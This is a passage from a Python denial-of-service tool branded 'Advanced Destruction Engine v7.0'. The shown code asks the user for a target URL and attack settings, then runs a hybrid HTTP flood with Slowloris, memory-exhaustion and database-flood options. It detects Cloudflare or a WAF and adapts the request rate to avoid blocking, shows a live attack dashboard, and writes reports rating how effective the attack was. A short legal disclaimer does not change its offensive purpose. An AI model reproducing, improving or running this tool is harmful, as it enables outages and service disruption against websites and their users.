            last_adjustment = start_time
            last_report = start_time
            
            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
                await asyncio.sleep(1)
                current_time = time.time()
                
                if current_time - last_adjustment > 30:
                    self._adjust_attack_strategy()
                    last_adjustment = current_time
                
                if current_time - last_report > 10:
                    self._print_status_report()
                    last_report = current_time
                    
        finally:
            for task in tasks:
                task.cancel()
            if self.session:
                await self.session.close()
    
    def _adjust_attack_strategy(self):
        total = AttackState.stats['total_requests']
        if total == 0:
            return
        success_rate = (AttackState.stats['successful'] / total) * 100
        block_rate = (AttackState.stats['blocked'] / total) * 100
        console.print(f"[cyan]📊 Adaptive adjustment: Success={success_rate:.1f}%, Blocked={block_rate:.1f}%[/]")
        if block_rate > 50:
            Config.MAX_RPS = max(100, int(Config.MAX_RPS * 0.7))
            console.print(f"[yellow]⚠️  High block rate detected, reducing RPS to {Config.MAX_RPS}[/]")
        elif success_rate > 80 and block_rate < 10:
            Config.MAX_RPS = min(5000, int(Config.MAX_RPS * 1.2))
            console.print(f"[green]✅ Good performance, increasing RPS to {Config.MAX_RPS}[/]")
    
    def _print_status_report(self):
        stats = AttackMonitor.calculate_stats()
        report = Panel.fit(
            f"[bold cyan]🔄 ADAPTIVE STATUS REPORT[/]\n\n"
            f"[yellow]Mode:[/] {self.adaptive_mode.upper()}\n"
            f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
            f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n"
            f"[blue]Current RPS:[/] {stats['current_rps']:,}\n"
            f"[magenta]Threads Active:[/] {Config.MAX_THREADS}\n"
            f"[cyan]Protection Detected:[/] {self.target.protection_type or 'None'}",
            border_style="bold cyan",
            padding=(1, 2)
        )
        console.print(report)

# ==================== MONITORING & DISPLAY ====================
class AttackMonitor:
    
    current_target = ""
    
    @staticmethod
    def calculate_stats():
        with AttackState.lock:
            total = AttackState.stats['total_requests']
            elapsed = time.time() - AttackState.start_time
            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
            AttackState.stats['current_rps'] = current_rps
            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
            AttackState.last_count = total
            
            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
            
            return {
                'total_requests': total,
                'successful': AttackState.stats['successful'],
                'blocked': AttackState.stats['blocked'],
                'errors': AttackState.stats['errors'],
                'current_rps': int(current_rps),
                'peak_rps': int(AttackState.stats['peak_rps']),
                'mbps_sent': mbps_sent,
                'mbps_recv': mbps_recv,
                'success_rate': success_rate,
                'elapsed_time': int(elapsed),
                'unique_ips': len(AttackState.stats['unique_ips']),
                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024,
                'waf_detected': AttackState.stats['waf_detected'],
                'cloudflare_detected': AttackState.stats['cloudflare_detected'],
                'persistent_connections': AttackState.stats['persistent_connections'],
                'slowloris_connections': AttackState.stats['slowloris_connections'],
                'memory_exhaustion_attempts': AttackState.stats['memory_exhaustion_attempts'],
                'database_floods': AttackState.stats['database_floods'],
                'connection_pool_size': AttackState.stats['connection_pool_size']
            }
    
    @staticmethod
    def display_dashboard():
        with Live(refresh_per_second=2, screen=True) as live:
            while AttackState.attacking:
                stats = AttackMonitor.calculate_stats()
                
                layout = Layout()
                layout.split_column(
                    Layout(name="header", size=3),
                    Layout(name="main", ratio=2),
                    Layout(name="footer", size=7)
                )
                
                protection_status = ""
                if stats['cloudflare_detected']:
                    protection_status = "[red]☁️ CLOUDFLARE DETECTED[/]"
                elif stats['waf_detected']:
                    protection_status = "[yellow]🛡️ WAF DETECTED[/]"
                else:
                    protection_status = "[green]✅ NO PROTECTION[/]"
                
                header = Panel(
                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v7.0[/] | "
                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
                    f"{protection_status} | "
                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
                    border_style="bold red"
                )
                layout["header"].update(header)
                
                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
                main_table.add_column("METRIC", style="yellow", width=20)
                main_table.add_column("VALUE", style="green", width=15)
                main_table.add_column("STATUS", style="magenta", width=20)
                
                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%",
                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
                main_table.add_row("Persistent Connections", f"{stats['persistent_connections']}", f"Pool: {stats['connection_pool_size']}")
                main_table.add_row("Slowloris Connections", f"{stats['slowloris_connections']}", "")
                main_table.add_row("Memory Attacks", f"{stats['memory_exhaustion_attempts']}", "")
                main_table.add_row("Database Floods", f"{stats['database_floods']}", "")
                main_table.add_row("Protection", f"{'☁️ CloudFlare' if stats['cloudflare_detected'] else '🛡️ WAF' if stats['waf_detected'] else '✅ None'}", "")
                
                layout["main"].update(Panel(main_table, border_style="bold blue"))
                
                progress_text = Text()
                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
                
                progress_table = Table(show_header=False, box=None)
                progress_table.add_column(width=50)
                
                success_bar_length = int(stats['success_rate'] / 2)
                success_bar = "█" * success_bar_length + "░" * (50 - success_bar_length)
                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
                
                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
                rps_bar_length = int(rps_percent / 2)
                rps_bar = "█" * rps_bar_length + "░" * (50 - rps_bar_length)
                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
                
                if stats['cloudflare_detected']:
                    protection_bar = "█" * 25 + "░" * 25
                    progress_table.add_row(f"Protection:  [{protection_bar}] CLOUDFLARE ACTIVE")
                elif stats['waf_detected']:
                    protection_bar = "█" * 15 + "░" * 35
                    progress_table.add_row(f"Protection:  [{protection_bar}] WAF ACTIVE")
                
                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS & PROTECTION", border_style="bold green"))
                live.update(layout)
                time.sleep(0.5)

# ==================== MAIN FUNCTIONS ====================
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ██╗██████╗ ███████╗ █████╗ ███╗   ██╗                    ║
    ║    ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║                    ║
    ║    ██║██████╔╝█████╗  ███████║██╔██╗ ██║                    ║
    ║    ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║                    ║
    ║    ██║██║  ██║███████╗██║  ██║██║ ╚████║                    ║
    ║    ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
    ║                                                              ║
    ║               ADVANCED DESTRUCTION ENGINE v7.0               ║
    ║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
    ║                    AUTHOR: IRFAN                             ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))
    
    features = Panel.fit(
        "[bold cyan]✨ ADVANCED FEATURES:[/]\n\n"
        "[green]✓[/] Hybrid Attack (Slowloris + HTTP Flood)\n"
        "[green]✓[/] CloudFlare Protection Bypass\n"
        "[green]✓[/] WAF/IPS Evasion Techniques\n"
        "[green]✓[/] Memory Exhaustion Attacks\n"
        "[green]✓[/] Database Flooding\n"
        "[green]✓[/] Persistent Connection Pool\n"
        "[green]✓[/] Adaptive Attack Strategies\n"
        "[green]✓[/] Real-time Protection Detection",
        border_style="bold blue",
        padding=(1, 2)
    )
    console.print(features)

def get_target():
    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
    console.print("[green]Examples:[/]")
    console.print("  • https://example.com")
    console.print("  • http://192.168.1.1:8080")
    console.print("  • http://test.com/admin")
    console.print("  • https://cloudflare-protected-site.com")
    
    while True:
        target_url = input("\n👉 Target URL: ").strip()
        if not target_url:
            console.print("[red]✗ Target URL cannot be empty![/]")
            continue
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            console.print("[yellow]⚠️  Adding http:// prefix[/]")
            target_url = 'http://' + target_url
        return target_url

def configure_attack():
    console.print("\n[bold cyan]⚙️  ADVANCED CONFIGURATION[/]")
    
    while True:
        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
        if not threads:
            break
        if threads.isdigit() and int(threads) > 0:
            Config.MAX_THREADS = int(threads)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    while True:
        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
        if not rps:
            break
        if rps.isdigit() and int(rps) > 0:
            Config.MAX_RPS = int(rps)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    while True:
        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
        if not duration:
            break
        if duration.isdigit() and int(duration) > 0:
            Config.ATTACK_DURATION = int(duration)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    intensity = input(f"Attack intensity (low/medium/high/extreme) [{Config.ATTACK_INTENSITY}]: ").strip().lower()
    if intensity in ['low', 'medium', 'high', 'extreme']:
        Config.set_intensity(intensity)
    
    waf_bypass = input(f"Enable WAF bypass? (y/n) [y]: ").strip().lower()
    Config.ENABLE_WAF_BYPASS = waf_bypass != 'n'
    
    human_delays = input(f"Enable human-like delays? (y/n) [y]: ").strip().lower()
    Config.HUMAN_LIKE_DELAYS = human_delays != 'n'
    
    slowloris = input(f"Enable Slowloris attack? (y/n) [y]: ").strip().lower()
    Config.ENABLE_SLOWLORIS = slowloris != 'n'
    
    memory_exhaustion = input(f"Enable memory exhaustion? (y/n) [y]: ").strip().lower()
    Config.ENABLE_RESOURCE_EXHAUSTION = memory_exhaustion != 'n'
    
    database_flood = input(f"Enable database flooding? (y/n) [y]: ").strip().lower()
    Config.ENABLE_DATABASE_FLOOD = database_flood != 'n'
    
    console.print(f"\n[green]✓ Configuration saved:[/]")
    console.print(f"  • Threads: {Config.MAX_THREADS}")
    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")
    console.print(f"  • Intensity: {Config.ATTACK_INTENSITY.upper()}")
    console.print(f"  • WAF Bypass: {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
    console.print(f"  • Human-like: {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
    console.print(f"  • Slowloris: {'[green]ENABLED[/]' if Config.ENABLE_SLOWLORIS else '[red]DISABLED[/]'}")
    console.print(f"  • Memory Exhaustion: {'[green]ENABLED[/]' if Config.ENABLE_RESOURCE_EXHAUSTION else '[red]DISABLED[/]'}")
    console.print(f"  • Database Flood: {'[green]ENABLED[/]' if Config.ENABLE_DATABASE_FLOOD else '[red]DISABLED[/]}")

async def run_smart_attack(target_url):
    target = TargetInfo(target_url)
    if not target.parse():
        console.print("[red]✗ Failed to parse target URL![/]")
        return
    
    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
    
    with console.status("[bold green]🔍 Scanning target for protections...[/]") as status:
        if target.scan_and_detect():
            console.print("[green]✅ Target scan completed![/]")
            if target.technologies:
                tech_text = ", ".join(target.technologies[:5])
                if len(target.technologies) > 5:
                    tech_text += f" and {len(target.technologies)-5} more"
                console.print(f"[cyan]Technologies:[/] {tech_text}")
            if target.protection_detected:
                console.print(f"[red]⚠️  PROTECTION DETECTED: {target.protection_type.upper()}[/]")
                if target.protection_type in ['cloudflare', 'captcha']:
                    Config.MAX_RPS = min(Config.MAX_RPS, 1000)
                    Config.REQUEST_TIMEOUT = 25
                    console.print("[yellow]🔧 Adjusting configuration for protected site...[/]")
                    console.print(f"[yellow]   • Max RPS reduced to: {Config.MAX_RPS}[/]")
                    console.print(f"[yellow]   • Timeout increased to: {Config.REQUEST_TIMEOUT}s[/]")
            if target.vulnerabilities:
                console.print(f"[yellow]🔓 Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
        else:
            console.print("[yellow]⚠️  Target scan failed, proceeding with basic detection[/]")
    
    manager = SmartAttackManager(target)
    
    if Config.CONNECTION_POOLING and Config.ENABLE_SLOWLORIS:
        pool = PersistentConnectionPool(target, Config.PERSISTENT_CONNECTIONS)
        pool.create_connections()
        pool.start()
    
    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
    monitor_thread.start()
    
    AttackState.attacking = True
    AttackState.start_time = time.time()
    
    console.print(f"\n[bold red]🚀 LAUNCHING HYBRID ATTACK ON {target.host}...[/]")
    if target.protection_detected:
        console.print(f"[yellow]🛡️  Using advanced {target.protection_type.upper()} bypass techniques[/]")
    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
    
    console.print("[yellow]Starting in:[/]")
    for i in range(3, 0, -1):
        console.print(f"[red]{i}...[/]")
        time.sleep(1)
    
    try:
        await manager.start_smart_attack(Config.MAX_THREADS)
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
    except Exception as e:
        console.print(f"[red]✗ Attack error: {e}[/]")
    finally:
        AttackState.attacking = False
        time.sleep(1)
        
        if Config.CONNECTION_POOLING and Config.ENABLE_SLOWLORIS:
            pool.stop()
        
        show_final_report(target)

def show_final_report(target):
    stats = AttackMonitor.calculate_stats()
    
    total_time = stats['elapsed_time']
    hours = total_time // 3600
    minutes = (total_time % 3600) // 60
    seconds = total_time % 60
    avg_rps = stats['total_requests'] / max(total_time, 1)
    block_rate = (stats['blocked'] / max(stats['total_requests'], 1)) * 100
    error_rate = (stats['errors'] / max(stats['total_requests'], 1)) * 100
    
    protection_analysis = ""
    if stats['cloudflare_detected']:
        protection_analysis = "[red]☁️ CLOUDFLARE PROTECTION ACTIVE[/] - Advanced bypass techniques used"
    elif stats['waf_detected']:
        protection_analysis = "[yellow]🛡️ WAF PROTECTION ACTIVE[/] - Evasion techniques applied"
    else:
        protection_analysis = "[green]✅ NO MAJOR PROTECTION DETECTED[/]"
    
    report = f"""
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                     ATTACK COMPLETE - DETAILED REPORT                    ║
    ╠══════════════════════════════════════════════════════════════════════════╣
    ║                                                                          ║
    ║  🎯 [bold cyan]TARGET INFORMATION[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  URL:          {target.protocol}://{target.host}:{target.port:<30} ║
    ║  IP Address:   {target.ip:<40} ║
    ║  Protection:   {protection_analysis:<30} ║
    ║                                                                          ║
    ║  ⏱️  [bold cyan]TIME STATISTICS[/]                                        ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Total Duration:   {hours:02d}:{minutes:02d}:{seconds:02d} (HH:MM:SS)          ║
    ║  Average RPS:      {avg_rps:,.1f} requests/second{'':<20} ║
    ║  Peak RPS:         {stats['peak_rps']:,} requests/second{'':<20} ║
    ║                                                                          ║
    ║  📊 [bold cyan]REQUEST STATISTICS[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Total Requests:   {stats['total_requests']:,}{'':<30} ║
    ║  Successful:       {stats['successful']:,} ({stats['success_rate']:.1f}%){'':<20} ║
    ║  Blocked:          {stats['blocked']:,} ({block_rate:.1f}%){'':<20} ║
    ║  Errors:           {stats['errors']:,} ({error_rate:.1f}%){'':<20} ║
    ║                                                                          ║
    ║  💾 [bold cyan]DATA TRANSFER[/]                                          ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Sent:             {stats['bytes_sent_mb']:.1f} MB{'':<35} ║
    ║  Received:         {stats['bytes_recv_mb']:.1f} MB{'':<35} ║
    ║  Bandwidth (Avg):  ▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s{'':<10} ║
    ║                                                                          ║
    ║  🔧 [bold cyan]CONFIGURATION USED[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Threads:          {Config.MAX_THREADS}{'':<40} ║
    ║  Max RPS:          {Config.MAX_RPS:,}{'':<40} ║
    ║  Intensity:        {Config.ATTACK_INTENSITY.upper()}{'':<40} ║
    ║  WAF Bypass:       {'ENABLED' if Config.ENABLE_WAF_BYPASS else 'DISABLED'}{'':<40} ║
    ║  Human-like Mode:  {'ENABLED' if Config.HUMAN_LIKE_DELAYS else 'DISABLED'}{'':<40} ║
    ║  Slowloris:        {'ENABLED' if Config.ENABLE_SLOWLORIS else 'DISABLED'}{'':<40} ║
    ║  Memory Attacks:   {'ENABLED' if Config.ENABLE_RESOURCE_EXHAUSTION else 'DISABLED'}{'':<40} ║
    ║  Database Flood:   {'ENABLED' if Config.ENABLE_DATABASE_FLOOD else 'DISABLED'}{'':<40} ║
    ║                                                                          ║
    ║  🌐 [bold cyan]NETWORK INFORMATION[/]                                     ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Unique IPs Used:  {stats['unique_ips']}{'':<40} ║
    ║  SSL Enabled:      {'YES' if target.ssl_enabled else 'NO'}{'':<40} ║
    ║  Persistent Conn:  {stats['persistent_connections']}{'':<40} ║
    ║  Slowloris Conn:   {stats['slowloris_connections']}{'':<40} ║
    ║  Memory Attacks:   {stats['memory_exhaustion_attempts']}{'':<40} ║
    ║  Database Floods:  {stats['database_floods']}{'':<40} ║
    ║                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """
    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))
    
    show_effectiveness_analysis(stats, target)
    save_report_to_file(stats, target)

def show_effectiveness_analysis(stats, target):
    effectiveness = ""
    recommendations = []
    
    if stats['success_rate'] >= 80:
        effectiveness = "[bold green]EXCELLENT[/] - Attack was highly effective"
        recommendations.append("Maintain current configuration for similar targets")
    elif stats['success_rate'] >= 50:
        effectiveness = "[bold yellow]GOOD[/] - Attack was moderately effective"
        recommendations.append("Consider increasing threads for better performance")
    elif stats['success_rate'] >= 20:
        effectiveness = "[bold orange]FAIR[/] - Attack faced significant resistance"
        recommendations.append("Try different attack vectors or increase delays")
    else:
        effectiveness = "[bold red]POOR[/] - Attack was mostly blocked"
        recommendations.append("Target has strong protection, consider different approach")
    
    if stats['blocked'] > stats['successful']:
        recommendations.append("Target has active protection (WAF/CloudFlare)")
        recommendations.append("Use more human-like delays and random patterns")
    
    if stats['mbps_sent'] < 1.0:
        recommendations.append("Low bandwidth usage, consider increasing request size")
    
    analysis_panel = Panel.fit(
        f"[bold cyan]📈 ATTACK EFFECTIVENESS ANALYSIS[/]\n\n"
        f"[yellow]Overall Rating:[/] {effectiveness}\n"
        f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
        f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n\n"
        f"[bold yellow]💡 RECOMMENDATIONS:[/]\n"
        + "\n".join([f"  • {rec}" for rec in recommendations]),
        border_style="bold yellow",
        padding=(1, 2)
    )
    console.print(analysis_panel)

def save_report_to_file(stats, target):
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"attack_report_{target.host}_{timestamp}.txt"
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("ADVANCED DESTRUCTION ENGINE v7.0 - ATTACK REPORT\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Target: {target.protocol}://{target.host}:{target.port}\n")
            f.write(f"IP Address: {target.ip}\n")
            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write("-" * 60 + "\n")
            f.write("STATISTICS\n")
            f.write("-" * 60 + "\n")
            f.write(f"Total Requests: {stats['total_requests']:,}\n")
            f.write(f"Successful: {stats['successful']:,} ({stats['success_rate']:.1f}%)\n")
            f.write(f"Blocked: {stats['blocked']:,}\n")
            f.write(f"Errors: {stats['errors']:,}\n")
            f.write(f"Duration: {stats['elapsed_time']} seconds\n")
            f.write(f"Average RPS: {stats['total_requests']/max(stats['elapsed_time'],1):.1f}\n")
            f.write(f"Peak RPS: {stats['peak_rps']:,}\n")
            f.write(f"Data Sent: {stats['bytes_sent_mb']:.1f} MB\n")
            f.write(f"Data Received: {stats['bytes_recv_mb']:.1f} MB\n")
            f.write(f"Persistent Connections: {stats['persistent_connections']}\n")
            f.write(f"Slowloris Connections: {stats['slowloris_connections']}\n")
            f.write(f"Memory Attacks: {stats['memory_exhaustion_attempts']}\n")
            f.write(f"Database Floods: {stats['database_floods']}\n\n")
            f.write("-" * 60 + "\n")
            f.write("CONFIGURATION\n")
            f.write("-" * 60 + "\n")
            f.write(f"Threads: {Config.MAX_THREADS}\n")
            f.write(f"Max RPS: {Config.MAX_RPS}\n")
            f.write(f"Intensity: {Config.ATTACK_INTENSITY}\n")
            f.write(f"WAF Bypass: {'Enabled' if Config.ENABLE_WAF_BYPASS else 'Disabled'}\n")
            f.write(f"Human-like Mode: {'Enabled' if Config.HUMAN_LIKE_DELAYS else 'Disabled'}\n")
            f.write(f"Slowloris: {'Enabled' if Config.ENABLE_SLOWLORIS else 'Disabled'}\n")
            f.write(f"Memory Attacks: {'Enabled' if Config.ENABLE_RESOURCE_EXHAUSTION else 'Disabled'}\n")
            f.write(f"Database Flood: {'Enabled' if Config.ENABLE_DATABASE_FLOOD else 'Disabled'}\n\n")
            f.write("=" * 60 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 60 + "\n")
        console.print(f"[green]📄 Report saved to: {filename}[/]")
    except Exception as e:
        console.print(f"[yellow]⚠️  Could not save report: {e}[/]")

def main():
    try:
        show_banner()
        
        disclaimer = Panel.fit(
            "[bold red]⚠️  LEGAL DISCLAIMER[/]\n\n"
            "[yellow]This tool is for EDUCATIONAL and AUTHORIZED testing ONLY![/]\n"
            "[cyan]By using this tool, you agree to:[/]\n"
            "1. Use only on systems you own or have explicit permission to test\n"
            "2. Comply with all applicable laws and regulations\n"
            "3. Accept full responsibility for your actions\n"
            "4. Not use for malicious purposes\n\n"
            "[green]Press Enter to accept and continue...[/]",
            border_style="bold red",
            padding=(1, 2)
        )
        console.print(disclaimer)
        input()
        
        target_url = get_target()
        configure_attack()
        
        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
        console.print(f"[cyan]Target:[/] {target_url}")
        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
        console.print(f"[cyan]RPS Limit:[/] {Config.MAX_RPS}")
        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
        console.print(f"[cyan]Intensity:[/] {Config.ATTACK_INTENSITY.upper()}")
        console.print(f"[cyan]WAF Bypass:[/] {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
        console.print(f"[cyan]Human-like:[/] {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
        console.print(f"[cyan]Slowloris:[/] {'[green]ENABLED[/]' if Config.ENABLE_SLOWLORIS else '[red]DISABLED[/]'}")
        console.print(f"[cyan]Memory Attacks:[/] {'[green]ENABLED[/]' if Config.ENABLE_RESOURCE_EXHAUSTION else '[red]DISABLED[/]'}")
        console.print(f"[cyan]Database Flood:[/] {'[green]ENABLED[/]' if Config.ENABLE_DATABASE_FLOOD else '[red]DISABLED[/]'}")
        
        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
        if confirm != 'START':
            console.print("[yellow]✗ Attack cancelled[/]")
            return
        
        asyncio.run(run_smart_attack(target_url))
        
        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
        if restart == 'y':
            AttackState.stats = {
                'total_requests': 0,
                'successful': 0,
                'blocked': 0,
                'errors': 0,
                'bytes_sent': 0,
                'bytes_received': 0,
                'peak_rps': 0,
                'current_rps': 0,
                'targets_hit': 0,
                'unique_ips': set(),
                'waf_detected': False,
                'cloudflare_detected': False,
                'persistent_connections': 0,
                'slowloris_connections': 0,
                'memory_exhaustion_attempts': 0,
                'database_floods': 0,
                'connection_pool_size': 0
            }
            AttackState.last_count = 0
            AttackState.attacking = False
            AttackState.start_time = 0
            os.system('clear' if os.name == 'posix' else 'cls')
            main()
        else:
            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v7.0![/]")
            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
            sys.exit(0)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Unexpected error: {e}[/]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    
    try:
        from rich import print
    except ImportError:
        console.print("[yellow]⚠️  'rich' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    
    try:
        import aiohttp
    except ImportError:
        console.print("[yellow]⚠️  'aiohttp' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
    
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Fatal error: {e}[/]")
        console.print("[yellow]Troubleshooting steps:[/]")
        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
        console.print("2. Check Python version (3.7+ required)")
        console.print("3. Run with: python ddos.py")
        sys.exit(1)